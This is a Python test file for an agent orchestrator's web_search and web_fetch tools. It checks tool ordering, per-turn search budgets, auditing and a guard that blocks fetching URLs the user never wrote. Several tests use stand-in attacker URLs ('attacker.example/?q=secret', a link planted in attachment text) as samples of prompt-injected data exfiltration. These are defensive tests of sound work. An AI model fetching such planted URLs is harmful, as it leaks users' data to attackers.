"""Executive-level wiring for the client-side SearXNG web_search tool.

Two things here are easy to get wrong and expensive when wrong:

  * Tool placement. The SearXNG tool is an ordinary function tool and must
    sort into the cached client list; the Anthropic server tool must stay
    appended after it with no cache_control. Getting that backwards either
    drops the cache marker or ships a server tool the API rejects.
  * Budget scope. The budget has to be per TURN. Built inside the iteration
    loop it silently becomes per-iteration, allowing WEB_SEARCH_MAX_USES
    searches on every round trip.
"""
from __future__ import annotations

import asyncio
import os
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

os.environ.setdefault("ANTHROPIC_API_KEY", "sk-test-not-used")

import pytest

from openexecutive.agents.tool_outcome import ToolOutcome

from ._search_helpers import (
    clear_search_env,
    msg,
    stream_cm,
    tool_use_block,
    use_local_model,
)


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch: pytest.MonkeyPatch) -> None:
    clear_search_env(monkeypatch)


@pytest.fixture(autouse=True)
def _no_audit_writes(monkeypatch: pytest.MonkeyPatch) -> None:
    """Driving a turn writes audit rows (the post-turn extraction among them)
    to the default ./episodic_memory.db — the audit-log pollution trap in
    CLAUDE.md."""
    monkeypatch.setattr("openexecutive.audit.log_event", lambda *a, **kw: None, raising=False)


def _use_local_model(monkeypatch: pytest.MonkeyPatch, *, searxng: bool = True) -> None:
    """A local default model — the Executive's model comes from DEFAULT_MODEL."""
    use_local_model(monkeypatch, searxng=searxng)
    monkeypatch.setenv("DEFAULT_MODEL", "qwen-local")


def _drive(
    monkeypatch: pytest.MonkeyPatch,
    messages: list[Any],
    user_message: str = "hi",
    **chat_kwargs: Any,
) -> dict[str, Any]:
    """Run one Executive turn against a scripted provider. Returns captures."""
    from openexecutive.orchestrator.executive import Executive
    from openexecutive.orchestrator.session import Session

    captured: dict[str, Any] = {"tools": [], "messages": []}
    remaining = list(messages)

    def fake_stream(**kwargs: Any) -> MagicMock:
        captured["tools"].append(kwargs["tools"])
        captured["messages"].append(kwargs["messages"])
        return stream_cm(remaining[min(len(captured["tools"]) - 1,
                                        len(remaining) - 1)])

    exec_ = Executive()
    provider = SimpleNamespace(messages_stream=fake_stream)

    async def _run() -> None:
        session = Session(session_id="t-client-search")
        async for _ in exec_.stream_chat(user_message, session, **chat_kwargs):
            pass

    with patch(
        "openexecutive.orchestrator.executive.get_provider", return_value=provider
    ):
        asyncio.run(_run())
    return captured


def test_searxng_tool_sorts_into_the_cached_client_list(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _use_local_model(monkeypatch)
    captured = _drive(monkeypatch, [msg(
        SimpleNamespace(type="text", text="done"), stop="end_turn"
    )])
    tools = captured["tools"][0]
    names = [t["name"] for t in tools]

    assert "web_search" in names and "web_fetch" in names
    # Exactly one definition of each tool, never both variants.
    assert names.count("web_search") == 1 and names.count("web_fetch") == 1
    # They are ordinary function tools...
    for name in ("web_search", "web_fetch"):
        web = next(t for t in tools if t["name"] == name)
        assert "input_schema" in web
        assert "type" not in web
    # ...so it participates in the alphabetical sort of the client list.
    assert names == sorted(names)
    # The cache marker is still on the final client tool.
    assert tools[-1].get("cache_control") == {"type": "ephemeral", "ttl": "1h"}


def test_claude_keeps_only_the_server_tool_even_with_searxng_configured(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The collision the per-turn wiring exists to prevent.

    Registering the SearXNG tool module-wide would offer Claude a client
    ``web_search`` next to the server tool of the same name. SEARXNG_URL
    being set must change nothing on a model with server search.
    """
    monkeypatch.setenv("SEARXNG_URL", "http://searxng:8080")
    monkeypatch.setenv("DEFAULT_MODEL", "claude-sonnet-5")
    captured = _drive(monkeypatch, [msg(
        SimpleNamespace(type="text", text="done"), stop="end_turn"
    )])
    tools = captured["tools"][0]
    web = [t for t in tools if t.get("name") == "web_search"]
    assert len(web) == 1
    assert web[0]["type"] == "web_search_20250305"
    fetch = [t for t in tools if t.get("name") == "web_fetch"]
    assert len(fetch) == 1 and fetch[0]["type"] == "web_fetch_20260309"
    assert tools[-2:] == [web[0], fetch[0]], "server tools must stay appended last"
    assert all("cache_control" not in t for t in tools[-2:])
    assert tools[-3].get("cache_control") == {"type": "ephemeral", "ttl": "1h"}


def test_client_search_is_audited_as_a_client_tool(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Same tool name as the server variant, different execution site.

    The server tool audits as kind="server_tool"; the client one must be
    distinguishable, not lumped in with ordinary skills.
    """
    _use_local_model(monkeypatch)
    messages = [
        msg(tool_use_block("web_search", "tu_1", query="ciao pricing")),
        msg(SimpleNamespace(type="text", text="done"), stop="end_turn"),
    ]
    audit_calls: list[dict[str, Any]] = []

    def _capture(event_type: str, summary: str, **kwargs: Any) -> None:
        audit_calls.append({"event_type": event_type, **kwargs})

    with (
        patch(
            "openexecutive.orchestrator.searxng_search._run_search",
            new=AsyncMock(return_value=ToolOutcome('{"results": []}')),
        ),
        patch(
            "openexecutive.orchestrator.executive.audit_log", side_effect=_capture
        ),
    ):
        _drive(monkeypatch, messages)

    search_rows = [
        c for c in audit_calls
        if c["event_type"] == "tool_invocation"
        and (c.get("details") or {}).get("tool") == "web_search"
    ]
    assert len(search_rows) == 1
    assert search_rows[0]["details"]["kind"] == "client_tool"


def test_local_model_without_searxng_gets_no_search_tool(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _use_local_model(monkeypatch, searxng=False)
    captured = _drive(monkeypatch, [msg(
        SimpleNamespace(type="text", text="done"), stop="end_turn"
    )])
    names = {t.get("name") for t in captured["tools"][0]}
    assert "web_search" not in names and "web_fetch" not in names


def test_client_search_is_dispatched_and_its_result_returned(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Covers the classification site as well as the dispatch site.

    Classification reads the handler map separately from dispatch; overlay
    only the dispatch lookup and the tool falls through to "Unknown tool".
    """
    _use_local_model(monkeypatch)
    messages = [
        msg(tool_use_block("web_search", "tu_1", query="ciao pricing")),
        msg(SimpleNamespace(type="text", text="done"), stop="end_turn"),
    ]
    with patch(
        "openexecutive.orchestrator.searxng_search._run_search",
        new=AsyncMock(
            return_value=ToolOutcome('{"results": [{"url": "https://x.example"}]}')
        ),
    ):
        captured = _drive(monkeypatch, messages)

    # Second generation carries the tool_result for the search.
    follow_up = captured["messages"][1]
    results = [
        block
        for turn in follow_up
        if isinstance(turn, dict) and isinstance(turn.get("content"), list)
        for block in turn["content"]
        if isinstance(block, dict) and block.get("type") == "tool_result"
    ]
    assert len(results) == 1
    assert results[0]["tool_use_id"] == "tu_1"
    assert "Unknown tool" not in results[0]["content"]
    assert "x.example" in results[0]["content"]


def test_budget_is_per_turn_not_per_iteration(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Two iterations, one search each, budget of 1 → one real search.

    A budget rebuilt inside the iteration loop would allow both.
    """
    _use_local_model(monkeypatch)
    monkeypatch.setenv("WEB_SEARCH_MAX_USES", "1")
    messages = [
        msg(tool_use_block("web_search", "tu_1", query="first")),
        msg(tool_use_block("web_search", "tu_2", query="second")),
        msg(SimpleNamespace(type="text", text="done"), stop="end_turn"),
    ]
    run_search = AsyncMock(return_value=ToolOutcome('{"results": []}'))
    with patch(
        "openexecutive.orchestrator.searxng_search._run_search", new=run_search
    ):
        captured = _drive(monkeypatch, messages)

    assert len(captured["tools"]) >= 3, "expected multiple loop iterations"
    assert run_search.await_count == 1, (
        "budget reset between iterations — it must be created before the loop"
    )
    # The over-budget call still gets an answered, flagged tool_result.
    third = captured["messages"][2]
    results = [
        block
        for turn in third
        if isinstance(turn, dict) and isinstance(turn.get("content"), list)
        for block in turn["content"]
        if isinstance(block, dict) and block.get("type") == "tool_result"
    ]
    over_budget = [r for r in results if r.get("is_error")]
    assert over_budget, "over-budget search was not flagged with is_error"


# --- the client web_fetch: what a turn has seen -----------------------------


def _tool_results(captured: dict[str, Any], call: int) -> dict[str, dict[str, Any]]:
    """The tool_result blocks the ``call``-th model request carried, by id."""
    return {
        block["tool_use_id"]: block
        for turn in captured["messages"][call]
        if isinstance(turn, dict) and isinstance(turn.get("content"), list)
        for block in turn["content"]
        if isinstance(block, dict) and block.get("type") == "tool_result"
    }


def _fetch_turn(
    monkeypatch: pytest.MonkeyPatch, url: str, user_message: str, **chat_kwargs: Any
) -> tuple[dict[str, Any], AsyncMock]:
    """One turn whose model fetches ``url`` and then answers."""
    run_fetch = AsyncMock(return_value=ToolOutcome('{"content": "Opening hours"}'))
    with patch("openexecutive.orchestrator.web_fetch._run_fetch", new=run_fetch):
        captured = _drive(monkeypatch, [
            msg(tool_use_block("web_fetch", "tu_f", url=url)),
            msg(SimpleNamespace(type="text", text="done"), stop="end_turn"),
        ], user_message, **chat_kwargs)
    return captured, run_fetch


def test_a_url_the_person_wrote_is_fetched(monkeypatch: pytest.MonkeyPatch) -> None:
    _use_local_model(monkeypatch)
    url = "https://ciao.example/about"
    words = f"What date is on {url}?"
    captured, run_fetch = _fetch_turn(monkeypatch, url, words, memory_text=words)
    assert run_fetch.await_count == 1
    assert run_fetch.await_args is not None and run_fetch.await_args.args[0] == url
    result = _tool_results(captured, 1)["tu_f"]
    assert "Opening hours" in result["content"] and not result.get("is_error")


def test_without_memory_text_a_url_in_the_prompt_is_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Fail closed: a caller that does not say what the person wrote (a
    channel that packed a backstory or attachment text into the prompt)
    gets no fetchable URL from it."""
    _use_local_model(monkeypatch)
    url = "https://ciao.example/about"
    captured, run_fetch = _fetch_turn(monkeypatch, url, f"What date is on {url}?")
    run_fetch.assert_not_awaited()
    assert _tool_results(captured, 1)["tu_f"].get("is_error")


def test_an_unseen_url_is_refused_without_a_request(monkeypatch: pytest.MonkeyPatch) -> None:
    _use_local_model(monkeypatch)
    captured, run_fetch = _fetch_turn(monkeypatch, "https://attacker.example/?q=secret", "hi")
    run_fetch.assert_not_awaited()
    result = _tool_results(captured, 1)["tu_f"]
    assert result.get("is_error") and "has not appeared" in result["content"]


def test_a_url_only_in_attachment_text_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    """The real seeding guard: the web chat appends an attachment's text to
    the prompt and passes the person's own words as memory_text. A URL that
    only the attachment holds must stay unfetchable."""
    _use_local_model(monkeypatch)
    own_words = "Summarise the attached file."
    planted = "https://attacker.example/collect"
    prompt = f"{own_words}\n\n[Attached: notes.pdf]\nSee {planted} for details."
    captured, run_fetch = _fetch_turn(monkeypatch, planted, prompt, memory_text=own_words)
    run_fetch.assert_not_awaited()
    assert _tool_results(captured, 1)["tu_f"].get("is_error")


def test_a_search_result_url_becomes_fetchable(monkeypatch: pytest.MonkeyPatch) -> None:
    """Search then fetch, across two rounds of one turn: the result URL joins
    the turn's seen set through the search handler."""
    import json

    _use_local_model(monkeypatch)
    url = "https://r.example/pricing"
    payload = json.dumps({"results": [{"url": url, "title": "Pricing", "content": "s"}]})
    run_fetch = AsyncMock(return_value=ToolOutcome('{"content": "EUR 40"}'))
    with (
        patch(
            "openexecutive.orchestrator.searxng_search._fetch_capped",
            new=AsyncMock(return_value=payload.encode()),
        ),
        patch("openexecutive.orchestrator.web_fetch._run_fetch", new=run_fetch),
    ):
        captured = _drive(monkeypatch, [
            msg(tool_use_block("web_search", "tu_s", query="ciao pricing")),
            msg(tool_use_block("web_fetch", "tu_f", url=url)),
            msg(SimpleNamespace(type="text", text="done"), stop="end_turn"),
        ])
    assert run_fetch.await_count == 1
    assert "EUR 40" in _tool_results(captured, 2)["tu_f"]["content"]


def test_a_url_in_a_message_added_mid_turn_is_fetchable(monkeypatch: pytest.MonkeyPatch) -> None:
    """A message the person adds while the turn runs is their own words too."""
    from openexecutive.orchestrator.turn_inbox import TurnInbox

    _use_local_model(monkeypatch)
    url = "https://added.example/page"
    inbox = TurnInbox()
    assert inbox.add("m1", f"Also check {url}")
    run_fetch = AsyncMock(return_value=ToolOutcome('{"content": "page"}'))
    with (
        patch(
            "openexecutive.orchestrator.searxng_search._run_search",
            new=AsyncMock(return_value=ToolOutcome('{"results": []}')),
        ),
        patch("openexecutive.orchestrator.web_fetch._run_fetch", new=run_fetch),
    ):
        # Round 1 runs a search, after which the loop takes the added message.
        _drive(monkeypatch, [
            msg(tool_use_block("web_search", "tu_s", query="ciao")),
            msg(tool_use_block("web_fetch", "tu_f", url=url)),
            msg(SimpleNamespace(type="text", text="done"), stop="end_turn"),
        ], inbox=inbox)
    assert run_fetch.await_count == 1


@pytest.mark.parametrize("committee", [False, True])
@pytest.mark.parametrize(("memory_text", "expected"), [
    ("my own words https://a.example", "my own words https://a.example"),
    # Fail closed: a caller that says nothing about the person's words may
    # have packed attachment text, mail or a backstory into the prompt.
    (None, ""),
])
def test_both_chat_paths_seed_from_the_speakers_own_words(
    monkeypatch: pytest.MonkeyPatch, committee: bool, memory_text: str | None, expected: str
) -> None:
    from openexecutive.orchestrator.executive import Executive
    from openexecutive.orchestrator.session import Session

    seen: list[str] = []

    async def fake_loop(self: Any, *args: Any, **kwargs: Any) -> Any:
        seen.append(kwargs["seen_url_text"])
        if False:  # pragma: no cover
            yield ""

    monkeypatch.setattr(Executive, "_stream_agent_loop", fake_loop)
    exec_ = Executive()
    stream = exec_.stream_chat_with_committee if committee else exec_.stream_chat

    async def _run() -> None:
        async for _ in stream("the prompt", Session(session_id="t-seed"), memory_text=memory_text):
            pass

    asyncio.run(_run())
    assert seen == [expected]
